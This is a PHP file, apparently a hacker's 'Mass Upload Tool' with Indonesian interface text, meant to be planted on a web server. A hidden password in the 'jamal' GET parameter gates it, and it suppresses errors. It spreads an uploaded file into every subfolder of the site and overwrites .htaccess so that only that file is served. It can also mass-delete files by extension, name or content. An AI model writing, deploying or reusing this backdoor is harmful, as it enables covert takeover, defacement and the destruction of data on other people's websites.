<?php
ini_set('upload_max_filesize', '1024M');
ini_set('post_max_size', '2048M');
ini_set('max_file_uploads', '50');
ini_set('memory_limit', '4096M');
ini_set('max_execution_time', 3600);
ini_set('max_input_time', 3600);
set_time_limit(0);
error_reporting(0);

$root = __DIR__;
$alwaysExclude = ['.', '..', 'cgi-bin'];

$jamal_hash = '$2y$10$U3Ist95T/Dy8R8dGMXdgYu1f8/mMkASCQ.Qabr3jwUYvQOcYv1isa';
if (!isset($_GET['jamal']) || !password_verify($_GET['jamal'], $jamal_hash)) {
    header("Location: /");
    exit;
}

$outputBuffer = [];
function echoIt($msg) {
    global $outputBuffer;
    $outputBuffer[] = $msg;
}

function findSubfolders($base, $exclude, &$results, $matchFolderName = '') {
    $dirs = scandir($base);
    foreach ($dirs as $d) {
        if ($d === '.' || $d === '..') continue;
        $full = realpath($base . DIRECTORY_SEPARATOR . $d);
        $shouldSkip = false;
        foreach ($exclude as $ex) {
            if (stripos($full, DIRECTORY_SEPARATOR . $ex . DIRECTORY_SEPARATOR) !== false ||
                substr($full, -strlen($ex)) === $ex) {
                $shouldSkip = true;
                break;
            }
        }
        if ($shouldSkip || !is_dir($full)) continue;
        if ($matchFolderName === '' || basename($full) === $matchFolderName) {
            $results[] = $full;
        }
        findSubfolders($full, $exclude, $results, $matchFolderName);
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'upload_spread' && isset($_FILES['uploadFile']) && $_FILES['uploadFile']['error'] === 0) {
        $srcFile = $_FILES['uploadFile']['tmp_name'];
        $newName = basename($_POST['newFileName'] ?: $_FILES['uploadFile']['name']);
        $uploadFolder = trim($_POST['uploadFolder'] ?? '');
        $perm = trim($_POST['permissions'] ?? '0444');
        $uploadPaths = [];
        $customEx = isset($_POST['excludeFolders']) ? array_map('trim', explode(',', $_POST['excludeFolders'])) : [];
        $exclude = array_unique(array_merge($alwaysExclude, $customEx));

        if ($uploadFolder) {
            findSubfolders($root, $exclude, $uploadPaths, $uploadFolder);
            if (is_dir($root . '/' . $uploadFolder)) {
                $uploadPaths[] = realpath($root . '/' . $uploadFolder);
            }
        } else {
            findSubfolders($root, $exclude, $uploadPaths, '');
            // FIX: Jangan upload ke root lagi
            // $uploadPaths[] = $root;  // KOMEN: supaya tidak ke root
        }

        $uploadPaths = array_unique($uploadPaths);
        if (empty($uploadPaths)) {
            echoIt("Ã¢ÂÅ’ Tidak ditemukan folder untuk upload.");
        } else {
            $data = @file_get_contents($srcFile);
            if ($data === false) {
                echoIt("Ã¢ÂÅ’ Gagal baca file sumber.");
            } else {
                $totalCopied = 0;
                foreach ($uploadPaths as $folder) {
                    $target = $folder . '/' . $newName;
                    if (@file_put_contents($target, $data) !== false) {
                        @chmod($target, octdec($perm));
                        echoIt("Ã¢Å“â€¦ Disalin ke: $target");
                        $totalCopied++;
                    } else {
                        echoIt("Ã¢ÂÅ’ Gagal salin: $target");
                    }
                }
                echoIt("Ã¢Å“â€¦ Total berhasil sebar: $totalCopied");
            }
        }
    }

    if ($action === 'find_and_show') {
        $targetFolder = trim($_POST['findFolderName']);
        $customEx = isset($_POST['excludeFoldersFind']) ? array_map('trim', explode(',', $_POST['excludeFoldersFind'])) : [];
        $exclude = array_unique(array_merge($alwaysExclude, $customEx));
        $matches = [];
        findSubfolders($root, $exclude, $matches, $targetFolder);
        if (is_dir($root . '/' . $targetFolder)) {
            $matches[] = realpath($root . '/' . $targetFolder);
        }

        $uploaded = false;
        $fname = '';
        $fdata = '';
        $permFile = trim($_POST['filePermission'] ?? '0444');
        $permHtaccess = trim($_POST['htaccessPermission'] ?? '0444');

        if (isset($_FILES['findUpload']) && $_FILES['findUpload']['error'] === 0) {
            $fdata = file_get_contents($_FILES['findUpload']['tmp_name']);
            $fname = trim($_POST['newFindFileName']) ?: basename($_FILES['findUpload']['name']);
            $uploaded = true;
        }

        if (empty($matches)) {
            echoIt("Ã¢ÂÅ’ Tidak ditemukan folder: $targetFolder");
        } else {
            foreach ($matches as $path) {
                if ($uploaded) {
                    $fp = $path . '/' . $fname;
                    if (file_put_contents($fp, $fdata) !== false) {
                        chmod($fp, octdec($permFile));
                        echoIt("Ã¢Å“â€¦ Upload ke: $fp");

                        $htaccessPath = $path . '/.htaccess';
                        if (file_exists($htaccessPath)) {
                            @unlink($htaccessPath);
                        }
                        $safeName = preg_quote($fname, '/');
                        $htaccessContent = <<<HT
Options -Indexes

<FilesMatch "\\.(?:php|php5|php7|php8|phtml|asp|aspx|exe|py|pl|cgi|fla|phar|shtml|sh|zip|rar|jpg|jpeg|png|gif|pdf|txt)$">
Order allow,deny
Deny from all
</FilesMatch>

<FilesMatch "^($safeName)$">
Order allow,deny
Allow from all
</FilesMatch>
HT;
                        file_put_contents($htaccessPath, $htaccessContent);
                        chmod($htaccessPath, octdec($permHtaccess));
                        echoIt("Ã°Å¸â€â€™ .htaccess baru dibuat di: $htaccessPath");
                    } else {
                        echoIt("Ã¢ÂÅ’ Gagal upload ke: $fp");
                    }
                }
            }
        }
    }

    // === Hapus lain tetap sama ===
    if ($action === 'delete_by_extension') {
        $ext = strtolower(trim($_POST['deleteExtension']));
        $customEx = isset($_POST['excludeFoldersDeleteExt']) ? array_map('trim', explode(',', $_POST['excludeFoldersDeleteExt'])) : [];
        $exclude = array_unique(array_merge($alwaysExclude, $customEx));
        $folders = [];
        findSubfolders($root, $exclude, $folders);
        $count = 0;
        foreach ($folders as $folder) {
            $files = scandir($folder);
            foreach ($files as $f) {
                $full = $folder . '/' . $f;
                if (is_file($full) && strtolower(pathinfo($f, PATHINFO_EXTENSION)) === $ext) {
                    @chmod($full, 0644);
                    if (@unlink($full)) {
                        echoIt("Ã°Å¸â€”â€˜Ã¯Â¸Â Dihapus: $full");
                        $count++;
                    }
                }
            }
        }
        echoIt("Ã¢Å“â€¦ Total file dihapus: $count");
    }

    if ($action === 'delete_by_name') {
        $targetName = trim($_POST['deleteFileName']);
        $customEx = isset($_POST['excludeFoldersDeleteName']) ? array_map('trim', explode(',', $_POST['excludeFoldersDeleteName'])) : [];
        $exclude = array_unique(array_merge($alwaysExclude, $customEx));
        $folders = [];
        findSubfolders($root, $exclude, $folders);
        $count = 0;
        foreach ($folders as $folder) {
            $target = $folder . '/' . $targetName;
            if (file_exists($target)) {
                @chmod($target, 0644);
                if (@unlink($target)) {
                    echoIt("Ã°Å¸â€”â€˜Ã¯Â¸Â Dihapus: $target");
                    $count++;
                }
            }
        }
        echoIt("Ã¢Å“â€¦ Total file dihapus: $count");
    }

    if ((isset($_FILES['deleteMatchFile']) && $_FILES['deleteMatchFile']['error'] === 0) || !empty($_POST['existingDeleteFilePath'])) {
        $refData = '';
        $refName = '';
        if (!empty($_POST['existingDeleteFilePath'])) {
            $src = trim($_POST['existingDeleteFilePath']);if (!file_exists($src)) die("Ã¢ÂÅ’ File referensi tidak ditemukan: $src");
            $refData = @file_get_contents($src);
            $refName = basename($src);
        } else {
            $refData = @file_get_contents($_FILES['deleteMatchFile']['tmp_name']);
            $refName = basename($_FILES['deleteMatchFile']['name']);
        }
        if (!$refData) die("Ã¢ÂÅ’ Gagal baca isi file referensi.");

        $customEx = isset($_POST['excludeFoldersDelete']) ? array_map('trim', explode(',', $_POST['excludeFoldersDelete'])) : [];
        $exclude = array_unique(array_merge($alwaysExclude, $customEx));
        $folders = [];
        findSubfolders($root, $exclude, $folders);
        foreach ($folders as $folder) {
            $items = scandir($folder);
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $path = $folder . '/' . $item;
                if (is_file($path)) {
                    $sizeSame = filesize($path) === strlen($refData);
                    $contentSame = $sizeSame && @file_get_contents($path) === $refData;
                    $nameSame = $item === $refName;
                    if ($contentSame || $nameSame) {
                        @chmod($path, 0644);
                        if (@unlink($path)) {
                            echoIt("Ã°Å¸â€”â€˜Ã¯Â¸Â Dihapus: $path");
                        } else {
                            echoIt("Ã¢ÂÅ’ Gagal hapus: $path");
                        }
                    }
                }
            }
        }
        echoIt("Ã¢Å“â€¦ Selesai hapus di semua folder.");
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Mass Upload Tool</title>
</head>
<body>
<h3>Ã°Å¸â€œâ€š Upload & Sebar File</h3>
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="action" value="upload_spread">
    <label>Folder tujuan: <input type="text" name="uploadFolder"></label><br>
    <label>Upload file: <input type="file" name="uploadFile" required></label><br>
    <label>Nama file baru: <input type="text" name="newFileName"></label><br>
    <label>Exclude folder: <input type="text" name="excludeFolders"></label><br>
    <label>Izin file (cth: 0644): <input type="text" name="permissions" value="0444"></label><br>
    <button type="submit">Upload & Sebar</button>
</form>

<hr>
<h3>Ã°Å¸â€Â Find Folder & Upload File</h3>
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="action" value="find_and_show">
    <label>Nama folder: <input type="text" name="findFolderName"></label><br>
    <label>Exclude folder: <input type="text" name="excludeFoldersFind"></label><br>
    <label>Upload ke hasil: <input type="file" name="findUpload"></label><br>
    <label>Nama file baru: <input type="text" name="newFindFileName"></label><br>
    <label>Permission file: <input type="text" name="filePermission" value="0444"></label><br>
    <label>Permission .htaccess: <input type="text" name="htaccessPermission" value="0444"></label><br>
    <button type="submit">Cari & Upload</button>
</form>

<hr>
<hr>
<h3>Ã°Å¸â€”â€˜Ã¯Â¸Â Hapus File Berdasarkan Ekstensi</h3>
<form method="post">
    <input type="hidden" name="action" value="delete_by_extension">
    <label>Ekstensi: <input type="text" name="deleteExtension"></label><br>
    <label>Exclude folder: <input type="text" name="excludeFoldersDeleteExt"></label><br>
    <button type="submit">Hapus</button>
</form>

<hr>
<h3>Ã°Å¸â€”â€˜Ã¯Â¸Â Hapus File Berdasarkan Nama</h3>
<form method="post">
    <input type="hidden" name="action" value="delete_by_name">
    <label>Nama file: <input type="text" name="deleteFileName"></label><br>
    <label>Exclude folder: <input type="text" name="excludeFoldersDeleteName"></label><br>
    <button type="submit">Hapus</button>
</form>

<hr>
<h3>Ã°Å¸â€”â€˜Ã¯Â¸Â Hapus File Isi/Nama Sama</h3>
<form method="post" enctype="multipart/form-data">
    <label>Upload referensi: <input type="file" name="deleteMatchFile"></label><br>
    <label>ATAU path file: <input type="text" name="existingDeleteFilePath"></label><br>
    <label>Exclude folder: <input type="text" name="excludeFoldersDelete"></label><br>
    <button type="submit">Hapus</button>
</form>

<hr>
<h3>Ã°Å¸â€œÂ¤ Output</h3>
<div style="border:1px solid #aaa;padding:10px;margin-top:20px;">
<?php
if (!empty($outputBuffer)) {
    foreach ($outputBuffer as $line) {
        echo $line . "<br>\n";
    }
}
?>
</div>
</body>
</html>
